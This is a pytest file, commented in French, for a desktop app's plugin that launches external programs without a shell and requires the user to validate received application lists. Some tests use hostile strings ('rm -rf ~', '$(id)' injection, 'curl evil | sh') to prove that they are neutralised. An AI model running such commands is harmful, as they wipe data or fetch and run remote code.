# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (C) 2026 Jean-François Kneib
"""Extension « Applications » : logique (commande sans shell, fichiers .desktop) et panneau dans la vraie fenêtre."""
import importlib.util
import os
import shutil
import sys
from pathlib import Path

import pytest

os.environ.setdefault("QT_QPA_PLATFORM", "offscreen")
pytest.importorskip("PyQt6")
from PyQt6.QtWidgets import QApplication  # noqa: E402

from scrinium.core.paths import Paths  # noqa: E402
from scrinium.core.store import Store  # noqa: E402
from scrinium.ui.fenetre import Fenetre  # noqa: E402

RACINE = Path(__file__).resolve().parent.parent / "plugins" / "applications"
_spec = importlib.util.spec_from_file_location("applications_logique", RACINE / "logique.py")
lg = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(lg)


def test_normaliser():
    assert lg.normaliser({"nom": "  Kate  ", "commande": " kate "})["nom"] == "Kate"
    assert lg.normaliser({"nom": "", "commande": "x"}) is None and lg.normaliser({"nom": "x", "commande": " "}) is None
    assert lg.normaliser("pas un dict") is None and lg.normaliser_liste("pas une liste") == []
    assert len(lg.normaliser_liste([{"nom": str(i), "commande": "x"} for i in range(500)])) == lg.MAX_APPLICATIONS


def test_commande_sans_shell_pas_d_injection():
    argv = lg.construire("kwrite --title 'a b' {selection}", "x; rm -rf ~ && $(id)", "T")
    assert argv == ["kwrite", "--title", "a b", "x; rm -rf ~ && $(id)"]        # la sélection reste UN argument
    assert lg.construire("mail -s {fiche}", "", "Mon titre") == ["mail", "-s", "Mon titre"]
    assert lg.construire("firefox", "ignorée", "T") == ["firefox"]
    with pytest.raises(ValueError):
        lg.construire("   ")
    with pytest.raises(ValueError):
        lg.construire("kwrite 'non fermé")
    assert lg.utilise_selection("a {selection}") and not lg.utilise_selection("a {fiche}")


def test_exemples_seulement_si_installes(monkeypatch):
    monkeypatch.setattr(lg.shutil, "which", lambda n: "/usr/bin/" + n if n in ("kwrite", "libreoffice") else None)
    assert [a["nom"] for a in lg.exemples_installes()] == ["KWrite", "LibreOffice Writer"]
    assert lg.installee("libreoffice --writer") and not lg.installee("introuvable") and not lg.installee("")


def test_lire_desktop(tmp_path):
    f = tmp_path / "a.desktop"
    f.write_text("[Desktop Entry]\nType=Application\nName=Éditeur\nName[fr]=Éditeur FR\nComment=Texte\nExec=editeur --nouveau %U %f\n"
                 "Icon=editeur\n[Desktop Action x]\nName=Autre\nExec=ailleurs\n")
    a = lg.lire_desktop(f, "fr")
    assert a == {"nom": "Éditeur FR", "icone": "editeur", "commande": "editeur --nouveau", "description": "Texte"}
    assert lg.lire_desktop(f, "")["nom"] == "Éditeur"
    for contenu in ("[Desktop Entry]\nType=Application\nName=X\nExec=x\nNoDisplay=true\n",
                    "[Desktop Entry]\nType=Link\nName=X\nExec=x\n", "[Desktop Entry]\nType=Application\nName=X\n"):
        g = tmp_path / "b.desktop"
        g.write_text(contenu)
        assert lg.lire_desktop(g) is None
    assert lg.lire_desktop(tmp_path / "absent.desktop") is None


def test_applications_installees_triees_sans_doublon(tmp_path, monkeypatch):
    d = tmp_path / "applications"
    d.mkdir()
    for nom, exe in (("Zeta", "zeta"), ("Alpha", "alpha"), ("Alpha2", "alpha")):
        (d / f"{nom}.desktop").write_text(f"[Desktop Entry]\nType=Application\nName={nom}\nExec={exe}\n")
    monkeypatch.setattr(lg, "dossiers_desktop", lambda: [d])
    assert [a["nom"] for a in lg.applications_installees()] == ["Alpha", "Zeta"]


def test_export_import():
    texte = lg.exporter([{"nom": "A", "commande": "a"}, {"nom": "", "commande": "x"}])
    assert lg.importer(texte) == [{"nom": "A", "icone": "", "commande": "a", "description": ""}]
    for mauvais in ("pas du json", '{"autre": 1}', '[1,2]'):
        with pytest.raises(ValueError):
            lg.importer(mauvais)


def test_lancer_detache(monkeypatch):
    appels = []
    monkeypatch.setattr(lg.subprocess, "Popen", lambda argv, **kw: appels.append((argv, kw)))
    lg.lancer(["kwrite", "x"])
    assert appels[0][0] == ["kwrite", "x"] and appels[0][1].get("start_new_session") is True
    with pytest.raises(OSError):
        monkeypatch.undo()
        lg.lancer(["commande-qui-n-existe-pas-xyz"])


# ---------- dans la fenêtre ----------
@pytest.fixture(scope="module")
def app():
    return QApplication.instance() or QApplication([])


@pytest.fixture
def fen(app, tmp_path, monkeypatch):
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "xdg"))
    monkeypatch.setattr("shutil.which", lambda n: "/usr/bin/" + n if n in ("kwrite", "thunderbird") else None)
    s = Store(Paths(tmp_path / "am"))
    s.sauver_reglages(recovery_asked=True)
    shutil.copytree(RACINE, s.paths.base / "plugins" / "applications")
    w = Fenetre(s)
    w.plugins.decouvrir()
    assert w.plugins.activer("applications"), w.plugins.infos["applications"].erreur
    w.nouvelle_fiche()
    w.titre.setText("Notes")
    w.texte.setPlainText("du texte à passer")
    w.sauver()
    monkeypatch.setattr(QApplication, "activeWindow", staticmethod(lambda: None))
    yield w
    w.quitter_vraiment = True
    w.close()


def plugin(fen):
    return fen.plugins.actifs["applications"][0]


@pytest.fixture
def lances(monkeypatch):
    res = []
    monkeypatch.setattr(sys.modules["scrinium_plugin_applications"].logique, "lancer", lambda argv: res.append(argv))
    return res


def test_panneau_montre_les_exemples_installes_et_lance_au_clic(fen, lances):
    p = plugin(fen)
    noms = [p.panneau.liste.item(i).text() for i in range(p.panneau.liste.count())]
    assert noms == ["Thunderbird", "KWrite"] and p.dock.windowTitle() == "Applications"
    p.panneau._clic(p.panneau.liste.item(0))
    assert lances == [["thunderbird"]]


def test_selection_et_titre_passes_en_arguments(fen, lances):
    p = plugin(fen)
    fen.texte.selectAll()
    p.lancer({"nom": "K", "icone": "", "commande": "kwrite --caption {fiche} {selection}", "description": ""})
    assert lances == [["kwrite", "--caption", "Notes", "du texte à passer"]]


def test_selection_manquante_et_fiche_verrouillee_refusees(fen, lances):
    p = plugin(fen)
    notes = []
    p.ctx.ui.notifier = lambda t, m: notes.append(m)
    a = {"nom": "K", "icone": "", "commande": "kwrite {selection}", "description": ""}
    fen.texte.moveCursor(fen.texte.textCursor().MoveOperation.Start)
    p.lancer(a)
    assert lances == [] and "Sélectionnez" in notes[-1]
    demo = next(f for t in fen.store.themes for f in t.fiches if f.verrou)
    fen.store.deverrouiller(demo, "scrinium")
    th = next(t for t in fen.store.themes if demo in t.fiches)
    fen._afficher(th, demo)
    fen.texte.selectAll()
    p.lancer(a)
    assert lances == [] and "verrouillée" in notes[-1]
    p.lancer({"nom": "T", "icone": "", "commande": "thunderbird", "description": ""})      # sans {selection} : permis
    assert lances == [["thunderbird"]]


def _modules():
    return sys.modules["scrinium_plugin_applications"]


def _fiche_apps(fen, texte, titre="Applications", theme="Outils"):
    """Fiche « applications » arrivée sans passer par la vue (comme un partage ou un dépôt) : jamais validée."""
    return plugin(fen).ctx.creer_fiche(theme, titre, texte)


def _noms(p):
    return [p.panneau.liste.item(i).text() for i in range(p.panneau.liste.count())]


def test_reglages_d_avant_servent_tant_qu_il_n_y_a_pas_de_fiche(fen):
    p = plugin(fen)
    p.ctx.reglages.set("applications", [{"nom": "Seule", "commande": "seule"}])
    p.panneau.rafraichir()
    assert [a["nom"] for a in p.applications()] == ["Seule"] and _noms(p) == ["Seule"]
    p.ctx.reglages.set("applications", [])
    p.panneau.rafraichir()
    assert p.applications() == [] and p.panneau.liste.count() == 0                  # une liste vide reste vide


def test_fiche_recue_inerte_puis_validee(fen, lances):
    p = plugin(fen)
    v = _fiche_apps(fen, lg.en_texte([{"nom": "Piege", "commande": "rm -rf ~"}, {"nom": "Ok", "commande": "ok"}]))
    assert not p.ctx.fiche_active(v) and p.a_valider() == 1
    assert "Piege" not in _noms(p) and not p.panneau.avis.isHidden()                 # inerte : rien dans le panneau, un avis
    assert _noms(p) == ["Thunderbird", "KWrite"]                                      # le panneau garde l'ancienne liste
    th = fen.store.theme("Outils")
    fen._afficher(th, th.fiches[0])                                                   # la fiche s'affiche avec sa vue et le bandeau
    vue = fen.vues_types["applications"]
    assert fen.pile.currentWidget() is vue and not fen.bandeau_validation.isHidden() and vue.actif is False
    assert [a["nom"] for a in vue.apps] == ["Piege", "Ok"] and not vue.boutons[0].isEnabled()      # lisible, pas modifiable
    fen.valider_fiche_courante()                                                      # l'utilisateur relit et valide
    assert p.ctx.fiche_active(v) and p.a_valider() == 0 and p.panneau.avis.isHidden()
    assert _noms(p) == ["Piege", "Ok"] and vue.actif and vue.boutons[0].isEnabled()


def test_la_fiche_modifiee_ailleurs_redevient_inerte(fen, lances):
    p = plugin(fen)
    v = _fiche_apps(fen, lg.en_texte([{"nom": "Ok", "commande": "ok"}]))
    th = fen.store.theme("Outils")
    f = th.fiches[0]
    fen.store.valider_fiche(th, f)
    p.panneau.rafraichir()
    assert _noms(p) == ["Ok"]
    item = p.panneau.liste.item(0)
    fen.store.enregistrer(th, f, f.titre, lg.en_texte([{"nom": "Ok", "commande": "ok ; curl evil | sh"}]))     # mise à jour reçue d'ailleurs
    p.panneau._clic(item)                                                             # clic sur l'icône affichée avant : rien ne part
    assert lances == [] and p.a_valider() == 1 and _noms(p) == ["Thunderbird", "KWrite"]


def test_texte_ecrit_dans_la_vue_est_valide(fen):
    p = plugin(fen)
    _fiche_apps(fen, lg.en_texte([{"nom": "Ok", "commande": "ok"}]))
    th = fen.store.theme("Outils")
    fen._afficher(th, th.fiches[0])
    fen.valider_fiche_courante()
    fen.vues_types["applications"].apps.append({"nom": "Neuve", "icone": "", "commande": "neuve", "description": ""})
    fen.vues_types["applications"]._enregistrer()                                    # modification faite dans la vue : validée une fois sauvée
    fen.sauver()
    assert "neuve" in th.fiches[0].texte and fen.store.fiche_validee(th, th.fiches[0]) and _noms(p) == ["Ok", "Neuve"]


def test_deux_fiches_validees_s_additionnent_sans_doublon(fen):
    p = plugin(fen)
    _fiche_apps(fen, lg.en_texte([{"nom": "A", "commande": "a"}, {"nom": "B", "commande": "b"}]), titre="Un")
    _fiche_apps(fen, lg.en_texte([{"nom": "B", "commande": "b"}, {"nom": "C", "commande": "c"}]), titre="Deux")
    th = fen.store.theme("Outils")
    for f in th.fiches:
        fen.store.valider_fiche(th, f)
    p.panneau.rafraichir()
    assert _noms(p) == ["B", "C", "A"]                                                  # par titre de fiche (Deux, Un), sans doublon


def test_migration_des_reglages_en_fiche(fen):
    p = plugin(fen)
    notes = []
    p.ctx.ui.notifier = lambda t, m: notes.append(m)
    p.ctx.reglages.set("applications", [{"nom": "Ancienne", "commande": "ancienne"}])
    p.ctx.reglages.set("migrees", False)
    p._migrer()
    th = fen.store.theme("Outils")
    assert th is not None and len(th.fiches) == 1 and th.fiches[0].titre == "Applications"
    assert [a["nom"] for a in lg.depuis_texte(th.fiches[0].texte)] == ["Ancienne"]
    assert not fen.store.fiche_validee(th, th.fiches[0]) and "validez-la" in notes[-1]     # créée inerte : à valider
    assert [a["nom"] for a in p.ctx.reglages.get("applications")] == ["Ancienne"]          # les réglages restent comme copie
    assert _noms(p) == ["Ancienne"]                                                        # le panneau continue avec l'ancienne liste
    p._migrer()                                                                           # une seule fois
    assert len(th.fiches) == 1


def test_modifier_cree_la_fiche_puis_la_rouvre(fen):
    p = plugin(fen)
    p.ctx.reglages.set("migrees", True)
    p.modifier()
    th = fen.store.theme("Outils")
    assert len(th.fiches) == 1 and fen.fiche is th.fiches[0] and fen.pile.currentWidget() is fen.vues_types["applications"]
    p.modifier()
    assert len(th.fiches) == 1                                                            # pas de seconde fiche


def test_desactiver_retire_le_type(fen):
    from scrinium.core import types_fiche
    assert types_fiche.type_de("#scrinium-applications\n") is not None and "applications" in fen.vues_types
    fen.plugins.desactiver("applications")
    assert types_fiche.type_de("#scrinium-applications\n") is None and "applications" not in fen.vues_types


def test_format_de_la_fiche_applications():
    liste = [{"nom": "Thunderbird", "icone": "thunderbird", "commande": "thunderbird", "description": "Courrier."},
             {"nom": "Sans icône", "icone": "", "commande": "x --opt: a", "description": ""}]
    texte = lg.en_texte(liste)
    assert texte.startswith("#scrinium-applications\n") and lg.depuis_texte(texte) == lg.normaliser_liste(liste)
    assert lg.depuis_texte("#scrinium-applications\nnotes libres\n## A\ncommande: a\nmystere: z\n## SansCommande\nicone: i\n") == \
        [{"nom": "A", "icone": "", "commande": "a", "description": ""}]
    assert lg.depuis_texte("") == [] and lg.depuis_texte(None) == [] and lg.depuis_texte("texte libre") == []
    beaucoup = lg.en_texte([{"nom": f"a{i}", "commande": f"c{i}"} for i in range(150)])
    assert len(lg.depuis_texte(beaucoup)) == lg.MAX_APPLICATIONS
    assert lg.TYPE.nom == "applications" and lg.TYPE.executable and lg.TYPE.marque == lg.MARQUE


def test_dialogues_se_construisent(fen):
    m = sys.modules["scrinium_plugin_applications"]
    p = plugin(fen)
    d = m.EditeurApplications()
    d.definir(p.applications())
    assert d.liste.count() == 2
    ch = m.DialogueChoix(None, apps=[{"nom": "Alpha", "icone": "", "commande": "alpha", "description": ""},
                                     {"nom": "Beta", "icone": "", "commande": "beta", "description": ""}])
    ch.filtre.setText("bet")
    assert [ch.liste.item(i).isHidden() for i in range(2)] == [True, False]
    da = m.DialogueApplication({"nom": "X", "icone": "", "commande": "x", "description": ""})
    assert da.resultat()["commande"] == "x"
